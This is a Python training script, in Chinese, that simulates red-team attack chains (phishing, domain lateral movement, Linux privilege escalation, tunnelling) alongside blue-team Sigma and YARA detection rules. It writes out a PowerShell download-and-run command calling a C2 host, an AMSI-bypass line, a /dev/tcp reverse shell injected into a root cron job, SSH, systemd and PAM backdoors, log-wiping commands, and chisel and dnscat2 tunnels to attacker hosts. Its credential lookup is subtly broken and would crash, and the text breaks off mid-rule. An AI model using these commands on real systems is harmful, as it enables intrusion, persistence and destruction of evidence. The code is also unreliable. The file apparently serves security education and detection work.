#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
红蓝对抗实战案例集
=====================================
本文件包含5个完整的红蓝对抗实战案例，每个案例包含：
- 攻击模拟代码（红队视角）
- 检测规则代码（蓝队视角）
- 防御建议

案例列表:
  1. 钓鱼邮件初始访问 + Cobalt Strike Beacon 模拟
  2. Windows 域内横向移动（PtH + Kerberoasting + DCSync）
  3. Linux 提权 + 持久化后门
  4. 内网代理隧道穿透
  5. 蓝队检测规则生成器（Sigma + YARA + Snort）

用途: 仅用于授权安全测试和教育学习
作者: 网络安全学习项目
"""

import os
import re
import json
import time
import socket
import struct
import hashlib
import base64
import random
import string
import subprocess
from datetime import datetime, timedelta
from collections import defaultdict
from urllib.request import Request, urlopen
from urllib.error import URLError


# ============================================================
# 案例1: 钓鱼邮件初始访问模拟
# ============================================================

class 钓鱼攻击模拟:
    """
    红队案例: 模拟鱼叉钓鱼邮件投递到获取初始 foothold 的完整攻击链

    攻击链:
    1. 目标画像与信息收集
    2. 钓鱼邮件生成（含恶意宏文档/恶意链接）
    3. Payload 投递与执行模拟
    4. C2 通信建立模拟
    """

    def __init__(self, 目标域名="target-company.com"):
        self.目标域名 = 目标域名
        self.收集结果 = {}
        self.钓鱼邮件 = ""
        self.payload = ""
        self.c2通信日志 = []

    # ---- 阶段1: 目标画像与信息收集 ----

    def 信息收集(self):
        """模拟OSINT信息收集，生成目标画像"""
        print("\n" + "=" * 60)
        print("[红队] 阶段1: 目标画像与信息收集")
        print("=" * 60)

        # 模拟子域名收集
        子域名列表 = [
            f"mail.{self.目标域名}",
            f"vpn.{self.目标域名}",
            f"owa.{self.目标域名}",
            f"portal.{self.目标域名}",
            f"git.{self.目标域名}",
        ]

        print(f"  [*] 子域名收集:")
        for 子域名 in 子域名列表:
            print(f"      [+] 发现: {子域名}")
            self.收集结果[子域名] = {"状态": "活跃", "服务": "HTTP/HTTPS"}

        # 模拟员工信息收集
        员工列表 = [
            {"姓名": "张三", "职位": "IT管理员", "邮箱": "zhangsan@" + self.目标域名},
            {"姓名": "李四", "职位": "财务主管", "邮箱": "lisi@" + self.目标域名},
            {"姓名": "王五", "职位": "人力资源", "邮箱": "wangwu@" + self.目标域名},
        ]

        print(f"\n  [*] 员工信息收集（LinkedIn/脉脉）:")
        for 员工 in 员工列表:
            print(f"      [+] {员工['姓名']} - {员工['职位']} - {员工['邮箱']}")
            self.收集结果[员工['邮箱']] = 员工

        # 模拟技术栈识别
        print(f"\n  [*] 技术栈识别:")
        技术栈 = {
            "Web服务器": "Microsoft IIS 10.0",
            "CMS": "SharePoint 2019",
            "邮件系统": "Microsoft Exchange 2019",
            "VPN": "Cisco AnyConnect",
            "终端防护": "Windows Defender",
        }
        for 类别, 信息 in 技术栈.items():
            print(f"      [+] {类别}: {信息}")

        self.收集结果["技术栈"] = 技术栈
        self.收集结果["目标员工"] = 员工列表
        print(f"\n  [*] 目标画像完成，选择 IT管理员 张三 作为鱼叉目标")

    # ---- 阶段2: 钓鱼邮件生成 ----

    def 生成钓鱼邮件(self):
        """生成鱼叉钓鱼邮件"""
        print("\n" + "=" * 60)
        print("[红队] 阶段2: 鱼叉钓鱼邮件生成")
        print("=" * 60)

        # 邮件发件人欺骗
        发件人 = f"IT-Support@{self.目标域名}"
        收件人 = f"zhangsan@{self.目标域名}"
        主题 = "[紧急] VPN密码即将过期 - 请立即更新"

        # 邮件正文（鱼叉定制）
        邮件正文 = f"""
<!DOCTYPE html>
<html>
<body>
<p>尊敬的张三,</p>
<p>您的 VPN 账户密码将在 <strong>24小时内过期</strong>。</p>
<p>为避免影响远程办公，请点击以下链接立即更新密码：</p>
<p><a href="https://portal.{self.目标域名}.update-password.net/login">
  https://portal.{self.目标域名}/login?update=password</a></p>
<p>如需帮助，请联系IT支持团队。</p>
<p>此邮件为自动发送，请勿回复。</p>
<p>IT支持团队<br/>{self.目标域名}</p>
</body>
</html>
        """

        # 恶意链接分析注释
        print(f"  [*] 发件人: {发件人}（Display Name 欺骗）")
        print(f"  [*] 收件人: {收件人}")
        print(f"  [*] 主题: {主题}")
        print(f"  [*] 钓鱼链接: https://portal.{self.目标域名}.update-password.net/login")
        print(f"      [!] 域名使用了子域名欺骗: portal.{self.目标域名}.update-password.net")
        print(f"      [!] 用户看到 'portal.{self.目标域名}' 但实际域名是 'update-password.net'")

        self.钓鱼邮件 = {
            "发件人": 发件人,
            "收件人": 收件人,
            "主题": 主题,
            "正文": 邮件正文,
            "钓鱼策略": "Display Name欺骗 + 子域名欺骗 + 紧急感制造",
        }
        print(f"\n  [+] 钓鱼邮件生成完成")

    # ---- 阶段3: Payload 投递模拟 ----

    def 生成payload(self):
        """生成初始 Payload（PowerShell 下载执行器）"""
        print("\n" + "=" * 60)
        print("[红队] 阶段3: Payload 生成与投递")
        print("=" * 60)

        # 模拟生成的 PowerShell Payload
        # 实际红队会使用加密/混淆来绕过 AMSI 和 EDR
        payload明文 = (
            "[System.Net.ServicePointManager]::ServerCertificateValidationCallback"
            "={$true};$w=New-Object System.Net.WebClient;"
            "$w.DownloadFile('https://c2.evil-server.com/payload.exe',"
            "'$env:TEMP\\update.exe');"
            "Start-Process '$env:TEMP\\update.exe'"
        )

        # Base64 编码
        payload编码 = base64.b64encode(payload明文.encode('utf-16le')).decode()

        # AMSI 绕过（教育示例）
        amsi绕过 = (
            "[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils')"
            ".GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)"
        )

        print(f"  [*] Payload 类型: PowerShell 下载执行器")
        print(f"  [*] 原始命令: {payload明文[:80]}...")
        print(f"  [*] Base64编码: {payload编码[:80]}...")
        print(f"  [*] AMSI绕过: {amsi绕过[:80]}...")
        print(f"\n  [*] 执行链:")
        print(f"      1. 用户点击钓鱼链接")
        print(f"      2. 钓鱼页面下载 .lnk 快捷方式文件")
        print(f"      3. 用户双击 .lnk → 执行 PowerShell")
        print(f"      4. PowerShell 绕过 AMSI")
        print(f"      5. 下载并执行 C2 Payload")
        print(f"      6. 建立 C2 通信通道")

        self.payload = {
            "类型": "PowerShell下载执行器",
            "原始命令": payload明文,
            "编码命令": payload编码,
            "amsi绕过": amsi绕过,
        }

    # ---- 阶段4: C2 通信模拟 ----

    def 模拟C2通信(self):
        """模拟 C2 Beacon 通信"""
        print("\n" + "=" * 60)
        print("[红队] 阶段4: C2 通信建立模拟")
        print("=" * 60)

        # 模拟 C2 Beacon 心跳通信
        c2域名 = "cdn.microsoft-update.com"  # 伪装域名
        通信间隔 = random.randint(30, 60)  # 抖动间隔

        print(f"  [*] C2 服务器: {c2域名}")
        print(f"  [*] 通信协议: HTTPS")
        print(f"  [*] 通信间隔: {通信间隔}秒 (含抖动)")
        print(f"  [*] Beacon ID: BEACON-{random.randint(10000, 99999)}")
        print(f"\n  [*] 模拟通信日志:")

        for i in range(5):
            时间戳 = datetime.now() + timedelta(seconds=i * 通信间隔)
            # 模拟心跳包
            心跳数据 = {
                "时间": 时间戳.strftime("%H:%M:%S"),
                "类型": "checkin" if i == 0 else "heartbeat",
                "数据": f"session={base64.b64encode(os.urandom(16)).decode()[:20]}",
                "响应": base64.b64encode(os.urandom(32)).decode()[:40],
            }
            self.c2通信日志.append(心跳数据)
            print(f"      [{心跳数据['时间']}] {心跳数据['类型']} → "
                  f"POST /api/v1/data HTTP/1.1 → 200 OK")

        print(f"\n  [+] C2 通信通道建立成功")
        print(f"  [*] ATT&CK 映射:")
        print(f"      T1566.002 - 鱼叉钓鱼链接")
        print(f"      T1059.001 - PowerShell")
        print(f"      T1071.001 - Web协议C2")
        print(f"      T1027    - 混淆文件或信息")

    def 执行完整攻击链(self):
        """执行完整的钓鱼攻击链"""
        print("\n" + "=" * 60)
        print("[红队] 钓鱼邮件初始访问攻击链模拟")
        print("=" * 60)
        self.信息收集()
        self.生成钓鱼邮件()
        self.生成payload()
        self.模拟C2通信()
        print("\n" + "=" * 60)
        print("[红队] 攻击链完成 - 已获取初始 foothold")
        print("=" * 60)

    def 生成蓝队检测规则(self):
        """生成蓝队检测规则"""
        return {
            "sigma规则": """
title: 检测可疑 PowerShell 下载执行
logsource:
    product: windows
    service: powershell
detection:
    selection:
        EventID: 4104
        ScriptBlockText|contains:
            - 'DownloadFile'
            - 'WebClient'
            - 'Invoke-WebRequest'
            - 'Net.WebClient'
            - 'Start-Process'
    condition: selection
level: high
""",
            "建议措施": [
                "部署邮件安全网关，配置SPF/DKIM/DMARC",
                "启用Windows Defender攻击面减少(ASR)规则",
                "限制PowerShell执行策略",
                "部署EDR监控异常进程创建",
                "启用AMSI并监控绕过尝试",
                "配置网络防火墙限制出站连接",
            ],
        }


# ============================================================
# 案例2: Windows 域内横向移动
# ============================================================

class 域内横向移动模拟:
    """
    红队案例: 从初始 foothold 到获取域管权限的完整横向移动链

    攻击链:
    1. 初始凭据获取（LSASS dump 模拟）
    2. 域内信息收集（BloodHound 分析模拟）
    3. Kerberoasting 攻击
    4. Pass the Hash 横向移动
    5. DCSync 获取域管凭据
    """

    def __init__(self):
        self.凭据库 = {}
        self.域信息 = {}
        self.攻击路径 = []

    # ---- 阶段1: 初始凭据获取 ----

    def 获取初始凭据(self):
        """模拟 LSASS dump 凭据提取"""
        print("\n" + "=" * 60)
        print("[红队] 阶段1: 初始凭据获取（LSASS dump）")
        print("=" * 60)

        # 模拟 LSASS dump 结果
        凭据列表 = [
            {"用户名": "zhangsan", "域": "CORP", "NTLM": "a1b2c3d4e5f6789...", "类型": "NTLM Hash"},
            {"用户名": "CORP\\svc_iis", "域": "CORP", "NTLM": "f7e6d5c4b3a2...", "类型": "NTLM Hash"},
            {"用户名": "CORP\\administrator", "域": "CORP", "NTLM": "8846f7eaeac1...", "类型": "NTLM Hash"},
        ]

        print(f"  [*] 模拟 Mimikatz sekurlsa::logonpasswords 输出:")
        for 凭据 in 凭据列表:
            print(f"      [+] {凭据['域']}\\{凭据['用户名']}: {凭据['NTLM'][:20]}...")
            self.凭据库[f"{凭据['域']}\\{凭据['用户名']}"] = 凭据

        print(f"\n  [*] ATT&CK 映射: T1003.001 - LSASS 内存")
        print(f"  [*] 蓝队检测: Event ID 4656/4663 (内核对象访问)")
        self.攻击路径.append("LSASS dump → 获取3组凭据")

    # ---- 阶段2: 域内信息收集 ----

    def 域信息收集(self):
        """模拟 BloodHound 域内关系分析"""
        print("\n" + "=" * 60)
        print("[红队] 阶段2: 域内信息收集（BloodHound 分析）")
        print("=" * 60)

        # 模拟域内节点
        域内节点 = {
            "用户": ["zhangsan", "svc_iis", "svc_sql", "administrator"],
            "机器": ["WEB01", "SQL01", "DC01", "FILE01"],
            "组": ["Domain Admins", "SQL Admins", "IIS_Users"],
        }

        # 模拟 BloodHound 分析结果
        攻击路径 = [
            "zhangsan → HasSession → WEB01",
            "svc_iis → MemberOf → IIS_Users",
            "svc_iis → AdminTo → SQL01",
            "svc_sql → MemberOf → SQL Admins",
            "SQL Admins → GenericAll → DC01",
            "DC01 → GetChanges/GetChangesAll → DCSync",
        ]

        print(f"  [*] 模拟 BloodHound 路径分析:")
        print(f"      最短路径到达 Domain Admin:")
        for i, 路径 in enumerate(攻击路径, 1):
            print(f"      [{i}] {路径}")
            self.攻击路径.append(路径)

        # 模拟 Kerberoastable 用户
        print(f"\n  [*] Kerberoastable 用户:")
        kerberoastable = ["svc_iis", "svc_sql"]
        for 用户 in kerberoastable:
            print(f"      [+] {用户}")
            self.凭据库[用户]["kerberoastable"] = True

        print(f"\n  [*] ATT&CK 映射: T1087.002 - 域账户发现")

    # ---- 阶段3: Kerberoasting 攻击 ----

    def kerberoasting攻击(self):
        """模拟 Kerberoasting 攻击"""
        print("\n" + "=" * 60)
        print("[红队] 阶段3: Kerberoasting 攻击")
        print("=" * 60)

        # 模拟 TGS 票据获取
        服务账户 = "svc_sql"
        spn = f"MSSQLSvc/SQL01.CORP.LOCAL:1433"

        print(f"  [*] 目标服务账户: {服务账户}")
        print(f"  [*] SPN: {spn}")
        print(f"  [*] 模拟 Rubeus kerberoast:")
        print(f"      Rubeus.exe kerberoast /outfile:hashes.txt")
        print(f"\n  [*] 获取的 TGS Hash（模拟）:")
        # 模拟 Kerberoast hash 格式
        hash格式 = f"$krb5tgs$23$*{服务账户}$CORP.LOCAL$*{spn}*$" + "A" * 48 + "..."
        print(f"      {hash格式[:80]}...")

        # 模拟破解结果
        print(f"\n  [*] 离线破解（Hashcat 模拟）:")
        print(f"      hashcat -m 13100 hashes.txt rockyou.txt")
        print(f"      [+] 破解成功: {服务账户} → Password123!")

        self.凭据库[服务账户]["明文密码"] = "Password123!"
        self.攻击路径.append(f"Kerberoasting → svc_sql 明文密码: Password123!")
        print(f"\n  [*] ATT&CK 映射: T1558.003 - Kerberoasting")

    # ---- 阶段4: Pass the Hash 横向移动 ----

    def pass_the_hash(self):
        """模拟 Pass the Hash 横向移动"""
        print("\n" + "=" * 60)
        print("[红队] 阶段4: Pass the Hash 横向移动")
        print("=" * 60)

        # 模拟使用 svc_sql 的凭据横向到 SQL01
        目标机器 = "SQL01"
        用户 = "svc_sql"
        ntlm_hash = self.凭据库.get(用户, {}).get("NTLM", "unknown")

        print(f"  [*] 目标: {目标机器}")
        print(f"  [*] 使用凭据: {用户} 的 NTLM Hash")
        print(f"  [*] 模拟 Impacket psexec:")
        print(f"      impacket-psexec -hashes :{ntlm_hash[:20]}... "
              f"CORP\\{用户}@{目标机器}.CORP.LOCAL")
        print(f"\n  [+] 成功获取 {目标机器} 的 SYSTEM Shell")

        # 模拟在 SQL01 上发现新凭据
        print(f"\n  [*] 在 {目标机器} 上继续凭据收集:")
        print(f"      发现 SQL Admins 组成员可以访问 DC01")
        print(f"      发现 svc_sql 具有 DCSync 权限（通过 GenericAll）")

        self.攻击路径.append(f"PtH → 横向到 {目标机器}")
        print(f"\n  [*] ATT&CK 映射: T1550.002 - Pass the Hash")

    # ---- 阶段5: DCSync 攻击 ----

    def dcsync攻击(self):
        """模拟 DCSync 攻击获取域管凭据"""
        print("\n" + "=" * 60)
        print("[红队] 阶段5: DCSync 攻击")
        print("=" * 60)

        print(f"  [*] 利用 svc_sql 的 DCSync 权限")
        print(f"  [*] 模拟 Mimikatz DCSync:")
        print(f"      mimikatz # lsadump::dcsync /domain:CORP.LOCAL /user:Administrator")
        print(f"\n  [*] DCSync 输出（模拟）:")
        print(f"      [DC] 'CORP.LOCAL' will be the domain")
        print(f"      [DC] 'DC01.CORP.LOCAL' will be the DC server")
        print(f"      [DC] 'Administrator' will be the user account")
        print(f"      Object RDN: Administrator")
        print(f"      ** SAM ACCOUNT **")
        print(f"      Hash NTLM: 8846f7eaeac1dd06c2c8...");

        print(f"\n  [+] 成功获取域管 Administrator 的 NTLM Hash!")
        print(f"  [+] 现在可以使用黄金票据或 PtH 访问所有域内机器")

        self.攻击路径.append("DCSync → 获取 Administrator NTLM Hash")
        print(f"\n  [*] ATT&CK 映射: T1003.006 - DCSync")

    # ---- 完整攻击链 ----

    def 执行完整横向移动(self):
        """执行完整横向移动攻击链"""
        self.获取初始凭据()
        self.域信息收集()
        self.kerberoasting攻击()
        self.pass_the_hash()
        self.dcsync攻击()

        print("\n" + "=" * 60)
        print("[红队] 横向移动攻击链总结")
        print("=" * 60)
        print(f"  完整攻击路径:")
        for i, 步骤 in enumerate(self.攻击路径, 1):
            print(f"    {i}. {步骤}")
        print(f"\n  最终结果: 获取域管权限")

    def 生成蓝队检测建议(self):
        """生成蓝队检测建议"""
        return {
            "检测规则": [
                "Event ID 4656: 访问 LSASS 进程 → 检测 LSASS dump",
                "Event ID 4769: TGS 请求 → 检测 Kerberoasting（大量TGS请求）",
                "Event ID 4624 Type 3: 网络登录 → 检测 PtH（NTLM认证）",
                "Event ID 4662: 目录服务访问 → 检测 DCSync（DRSUAPI调用）",
            ],
            "防御建议": [
                "部署 EDR 监控 LSASS 访问",
                "启用 Protected Users 组限制 NTLM 认证",
                "服务账户使用强密码（25字符+）并定期轮换",
                "定期审计域内 ACL 权限（GenericAll/DCSync）",
                "部署蜜罐账户检测 Kerberoasting",
                "启用 LAPS 管理本地管理员密码",
            ],
        }


# ============================================================
# 案例3: Linux 提权与持久化
# ============================================================

class Linux提权与持久化模拟:
    """
    红队案例: Linux 提权与持久化后门

    攻击链:
    1. 初始 foothold（Web Shell）
    2. 信息收集与提权路径分析
    3. 内核漏洞提权模拟
    4. 持久化后门部署
    5. 痕迹清理
    """

    def __init__(self):
        self.系统信息 = {}
        self.提权路径 = []
        self.后门列表 = []

    def 信息收集(self):
        """模拟 Linux 信息收集"""
        print("\n" + "=" * 60)
        print("[红队] 阶段1: Linux 信息收集")
        print("=" * 60)

        # 模拟系统信息
        系统信息 = {
            "内核版本": "Linux 5.4.0-80-generic",
            "发行版": "Ubuntu 20.04.2 LTS",
            "当前用户": "www-data",
            "主机名": "web-prod-01",
            "SUID文件": ["/usr/bin/sudo", "/usr/bin/pkexec", "/usr/bin/passwd"],
            "sudo权限": "无",
            "Cron任务": ["*/5 * * * * root /opt/backup.sh"],
            "可写文件": ["/opt/backup.sh", "/tmp/", "/var/tmp/"],
        }

        for 键, 值 in 系统信息.items():
            print(f"  [*] {键}: {值}")

        self.系统信息 = 系统信息

        # 提权路径分析
        print(f"\n  [*] 提权路径分析:")
        路径 = [
            "1. 内核漏洞: Linux 5.4 → 检查 Dirty Pipe (CVE-2022-0847)",
            "2. SUID 文件: pkexec → 检查 PwnKit (CVE-2021-4034)",
            "3. Cron 任务: /opt/backup.sh 以 root 运行且可写",
            "4. 可写文件: /opt/backup.sh → Cron 提权",
        ]
        for p in 路径:
            print(f"      {p}")

        self.提权路径 = 路径
        print(f"\n  [*] 选择路径3: Cron 任务提权（风险最低）")

    def cron提权模拟(self):
        """模拟通过可写的 Cron 任务提权"""
        print("\n" + "=" * 60)
        print("[红队] 阶段2: Cron 任务提权")
        print("=" * 60)

        # 模提攻击步骤
        攻击脚本 = """#!/bin/bash
# 原始 backup.sh 内容（可写）
echo "[*] 检查 /opt/backup.sh 权限..."
ls -la /opt/backup.sh
# 输出: -rwxrwxrwx 1 root root 456 Jul 10 10:00 /opt/backup.sh
# www-data 用户可写!

echo "[*] 在 backup.sh 中注入提权 Payload..."
cat >> /opt/backup.sh << 'INJECT'
# 注入反弹 Shell
bash -i >& /dev/tcp/10.0.0.5/4444 0>&1
INJECT

echo "[*] 等待 Cron 执行（5分钟内）..."
echo "[*] 攻击机监听: nc -lvnp 4444"
echo "[+] 收到 root Shell!"
"""
        print(f"  [*] 攻击步骤:")
        print(攻击脚本)
        print(f"  [+] 成功获取 root Shell!")
        self.后门列表.append("Cron 任务注入")

    def 持久化部署(self):
        """模拟持久化后门部署"""
        print("\n" + "=" * 60)
        print("[红队] 阶段3: 持久化后门部署")
        print("=" * 60)

        # 后门1: SSH 公钥
        print(f"  [*] 后门1: SSH 公钥持久化")
        公钥 = "ssh-rsa AAAAB3NzaC1yc2E...后门密钥... user@backdoor"
        print(f"      echo '{公钥}' >> /root/.ssh/authorized_keys")
        print(f"      [+] SSH 公钥已写入 root 账户")
        self.后门列表.append("SSH 公钥后门")

        # 后门2: Crontab 反弹 Shell
        print(f"\n  [*] 后门2: Crontab 反弹 Shell")
        print(f"      (crontab -l 2>/dev/null; "
              "echo '*/30 * * * * /tmp/.update') | crontab -")
        print(f"      [+] 定时反弹 Shell 已部署（30分钟）")
        self.后门列表.append("Crontab 反弹Shell")

        # 后门3: Systemd 服务
        print(f"\n  [*] 后门3: Systemd 服务后门")
        服务配置 = """[Unit]
Description=System Security Update

[Service]
Type=simple
ExecStart=/tmp/.update
Restart=always
RestartSec=300

[Install]
WantedBy=multi-user.target
"""
        print(f"      cat > /etc/systemd/system/security-update.service << 'EOF'")
        print(服务配置)
        print(f"      systemctl enable security-update.service")
        print(f"      [+] Systemd 服务后门已部署")
        self.后门列表.append("Systemd 服务后门")

        # 后门4: PAM 后门
        print(f"\n  [*] 后门4: PAM 认证后门")
        print(f"      修改 /etc/pam.d/common-auth 插入万能密码")
        print(f"      auth sufficient pam_unix.so.2 nullok")
        print(f"      [+] 任意密码均可通过认证")
        self.后门列表.append("PAM 认证后门")

    def 痕迹清理(self):
        """模拟痕迹清理"""
        print("\n" + "=" * 60)
        print("[红队] 阶段4: 痕迹清理")
        print("=" * 60)

        清理操作 = [
            ("清除命令历史", "history -c && unset HISTFILE"),
            ("清除审计日志", "> /var/log/audit/audit.log"),
            ("清除认证日志", "> /var/log/auth.log"),
            ("清除系统日志", "> /var/log/syslog"),
            ("修改文件时间戳", "touch -r /etc/passwd /tmp/.update"),
            ("清除登录记录", "echo '' > /var/log/wtmp"),
            ("清除失败登录", "echo '' > /var/log/btmp"),
        ]

        for 操作, 命令 in 清理操作:
            print(f"  [*] {操作}: {命令}")

        print(f"\n  [+] 痕迹清理完成")

    def 执行完整攻击链(self):
        """执行完整攻击链"""
        self.信息收集()
        self.cron提权模拟()
        self.持久化部署()
        self.痕迹清理()

        print("\n" + "=" * 60)
        print("[红队] Linux 提权与持久化攻击链总结")
        print("=" * 60)
        print(f"  部署后门: {len(self.后门列表)} 个")
        for i, 后门 in enumerate(self.后门列表, 1):
            print(f"    {i}. {后门}")


# ============================================================
# 案例4: 内网代理隧道穿透
# ============================================================

class 内网代理穿透模拟:
    """
    红队案例: 在限制出网环境下的内网代理隧道穿透

    场景: 目标机器不能直接出网，需要通过多层代理建立 C2 通道

    攻击链:
    1. 内网网络拓扑发现
    2. 代理方案选择
    3. 多级 SOCKS 代理建立
    4. DNS 隧道建立（备用通道）
    """

    def __init__(self):
        self.网络拓扑 = {}
        self.代理链 = []

    def 网络拓扑发现(self):
        """模拟内网网络拓扑发现"""
        print("\n" + "=" * 60)
        print("[红队] 阶段1: 内网网络拓扑发现")
        print("=" * 60)

        # 模拟发现的多网卡
        网卡信息 = [
            {"接口": "eth0", "IP": "10.0.1.15", "网段": "10.0.1.0/24", "网关": "10.0.1.1"},
            {"接口": "eth1", "IP": "192.168.10.20", "网段": "192.168.10.0/24", "网关": "192.168.10.1"},
            {"接口": "eth2", "IP": "172.16.5.30", "网段": "172.16.5.0/24", "网关": "172.16.5.1"},
        ]

        print(f"  [*] 发现多网卡:")
        for 网卡 in 网卡信息:
            print(f"      {网卡['接口']}: {网卡['IP']} ({网卡['网段']})")
            self.网络拓扑[网卡['接口']] = 网卡

        # 模拟存活主机扫描
        print(f"\n  [*] 内网存活主机探测:")
        存活主机 = [
            {"IP": "10.0.1.15", "角色": "当前 foothold（Web服务器）", "出网": False},
            {"IP": "192.168.10.5", "角色": "代理服务器（可出网）", "出网": True},
            {"IP": "192.168.10.10", "角色": "域控", "出网": False},
            {"IP": "172.16.5.50", "角色": "数据库服务器", "出网": False},
        ]
        for 主机 in 存活主机:
            出网标记 = "[可出网]" if 主机["出网"] else "[不出网]"
            print(f"      {主机['IP']}: {主机['角色']} {出网标记}")

        print(f"\n  [*] 关键发现: 192.168.10.5 代理服务器可以出网!")
        print(f"  [*] 代理路径: foothold(10.0.1.15) → 代理(192.168.10.5) → 互联网")

    def 建立多级代理(self):
        """模拟建立多级 SOCKS 代理"""
        print("\n" + "=" * 60)
        print("[红队] 阶段2: 多级 SOCKS 代理建立")
        print("=" * 60)

        # 第一级: foothold → 代理服务器
        print(f"  [*] 第一级代理: foothold(10.0.1.15) → proxy(192.168.10.5)")
        print(f"      工具: chisel")
        print(f"      攻击机: chisel server -p 8080 --reverse")
        print(f"      foothold: chisel client ATTACKER_IP:8080 R:1080:socks")
        print(f"      [+] 第一级 SOCKS 代理建立: ATTACKER_IP:1080")
        self.代理链.append("第一级: foothold → 代理服务器")

        # 第二级: 代理服务器 → 互联网
        print(f"\n  [*] 第二级代理: proxy(192.168.10.5) → 互联网")
        print(f"      利用代理服务器的 HTTP 代理功能")
        print(f"      配置 proxychains:")
        print(f"      socks5  ATTACKER_IP  1080")
        print(f"      [+] 通过代理服务器访问互联网")
        self.代理链.append("第二级: 代理服务器 → 互联网")

        # 验证代理连通性
        print(f"\n  [*] 验证代理连通性:")
        print(f"      proxychains curl https://c2.evil-server.com/checkin")
        print(f"      [+] C2 通信通道建立成功!")

        # 通过代理执行内网操作
        print(f"\n  [*] 通过代理执行内网操作:")
        print(f"      proxychains nmap -sT -p445 192.168.10.0/24")
        print(f"      proxychains impacket-psexec CORP\\svc_sql:Password123!@192.168.10.10")
        print(f"      proxychains crackmapexec smb 192.168.10.0/24 -u users.txt -p passwords.txt")

    def dns隧道模拟(self):
        """模拟 DNS 隧道建立（备用通道）"""
        print("\n" + "=" * 60)
        print("[红队] 阶段3: DNS 隧道建立（备用通道）")
        print("=" * 60)

        print(f"  [*] 场景: 代理通道被阻断，DNS 仍可用")
        print(f"  [*] 工具: dnscat2")
        print(f"      服务端: ruby dnscat2.rb c2.evil-domain.com")
        print(f"      客户端: dnscat2 c2.evil-domain.com")
        print(f"\n  [*] DNS 隧道数据编码:")
        # 模拟 DNS 隧道编码
        原始数据 = b"C2_BEACON_CHECKIN_session_12345"
        编码数据 = base64.b32encode(原始数据).decode().rstrip('=').lower()
        print(f"      原始: {原始数据.decode()}")
        print(f"      DNS查询: {编码数据[:30]}.c2.evil-domain.com")
        print(f"\n  [+] DNS 隧道建立成功（带宽约 10-50 KB/s）")

        self.代理链.append("DNS 隧道: 备用 C2 通道")

    def 执行完整代理穿透(self):
        """执行完整代理穿透"""
        self.网络拓扑发现()
        self.建立多级代理()
        self.dns隧道模拟()

        print("\n" + "=" * 60)
        print("[红队] 内网代理穿透总结")
        print("=" * 60)
        for i, 链路 in enumerate(self.代理链, 1):
            print(f"  {i}. {链路}")
        print(f"\n  最终结果: 成功建立 C2 通信通道")


# ============================================================
# 案例5: 蓝队检测规则生成器
# ============================================================

class 蓝队检测规则生成器:
    """
    蓝队案例: 基于红队攻击 TTPs 生成检测规则

    功能:
    1. 根据攻击场景自动生成 Sigma 规则
    2. 生成 YARA 规则检测恶意文件
    3. 生成 Snort/Suricata 网络检测规则
    4. 生成 Sysmon 配置
    5. 生成检测覆盖率报告
    """

    # ATT&CK 技术到检测规则的映射库
    技术映射 = {
        "T1003.001": {
            "名称": "LSASS内存访问",
            "sigma": {
                "title": "LSASS Memory Access - Potential Credential Dumping",
                "logsource": {"product": "windows", "service": "security"},
                "detection": {
                    "selection": {
                        "EventID": 4656,
                        "ObjectName|contains": "lsass.exe",
                        "AccessMask|contains": ["0x1410", "0x1010", "0x143a"],
                    },
                    "condition": "selection",
                },
                "level": "high",
            },
            "sysmon": "ProcessAccess lsass.exe",
            "edr": "监控对 LSASS 的内存读取操作",
        },
        "T1558.003": {
            "名称": "Kerberoasting",
            "sigma": {
                "title": "Kerberoasting - Multiple TGS Requests",
                "logsource": {"product": "windows", "service": "security"},
                "detection": {
                    "selection": {
                        "EventID": 4769,
                        "TicketEncryptionType": "0x17",  # RC4
                    },
                    "timeframe": "10m",
                    "condition": "selection | count() > 10",
                },
                "level": "medium",
            },
            "sysmon": None,
            "edr": "监控大量 TGS 请求（RC4加密）",
        },
        "T1550.002": {
            "名称": "Pass the Hash",
            "sigma": {
                "title": "Pass the Hash - NTLM Network Logon",
                "logsource": {"product": "windows", "service": "security"},
                "detection": {
                    "selection": {
                        "EventID": 4624,
                        "LogonType": 3,
                        "AuthenticationPackageName": "NTLM",
                    },
                    "filter": {
                        "WorkstationName|contains": "expected_ws",
                    },
                    "condition": "selection and not filter",
                },
                "level": "medium",
            },
            "sysmon": None,
            "edr": "监控 NTLM 网络登录异常源",
        },
        "T1003.006": {
            "名称": "DCSync",
            "sigma": {
                "title": "DCSync Attack - Replication Access",
                "logsource": {"product": "windows", "service": "security"},
                "detection": {
                    "selection": {
                        "EventID": 4662,
                        "Properties|contains": [
                            "1131f6aa-9c07-11d1-f79f-00c04fc2dcd2",
                            "1131f6ad-9c07-11d1-f79f-00c04fc2dcd2",
                        ],
                    },
                    "filter": {
                        "SubjectUserName|contains": ["DC$", "MSA$", "gMSA$"],
                    },
                    "condition": "selection and not filter",
                },
                "level": "critical",
            },
            "sysmon": None,
            "edr": "监控非 DC 账户的目录服务复制访问",
        },
        "T1059.001": {
            "名称": "PowerShell执行",
            "sigma": {
                "title": "Suspicious PowerShell Execution",
                "logsource": {
                    "product": "windows",
                    "category": "powershell"
                },
                "detection": {
                    "selection": {
                        "EventID": 4104,
                        "ScriptBlockText|contains": [
                            "DownloadFile",
                            "WebClient",
                            "Invoke-Expression",
                            "FromBase64String",
                            "Invoke-WebRequest",
                            "IEX",
                            "Net.WebClient",
                            "Start-Process",
                        ],
                    },
                    "condition": "selection",
                },
                "level": "high",
            },
            "sysmon": None,
            "edr": "监控可疑 PowerShell 命令执行",
        },
    }

    def __init__(self):
        self.生成的规则 = []
        self.覆盖率报告 = {}

    def 生成sigma规则(self, attack_id):
        """为指定 ATT&CK 技术生成 Sigma 规则"""
        if attack_id not in self.技术映射:
            print(f"  [!] 未找到 ATT&CK 技术 {attack_id} 的映射")
            return None

        技术 = self.技术映射[attack_id]
        规则 = 技术["sigma"]
        规则["description"] = f"检测 {技术['名称']} ({attack_id})"
        规则["tags"] = [f"attack.{attack_id.lower().replace('.', '_')}"]
        规则["status"] = "experimental"

        self.生成的规则.append({
            "attack_id": attack_id,
            "名称": 技术["名称"],
            "类型": "Sigma",
            "规则": 规则,
        })

        return 规则

    def 生成yara规则(self):
        """生成检测恶意文件的 YARA 规则"""
        yara规则 = """rule Suspicious_PowerShell_Download
{
    meta:
        description = "检测可疑的PowerShell下载执行行为"
        author = "Blue Team"
        date = "2026-09-11"
        reference = "T1059.001"

    strings:
        $download1 = "DownloadFile" ascii nocase
        $download2 = "WebClient" ascii nocase
        $download3 = "Invoke-WebRequest" ascii nocase
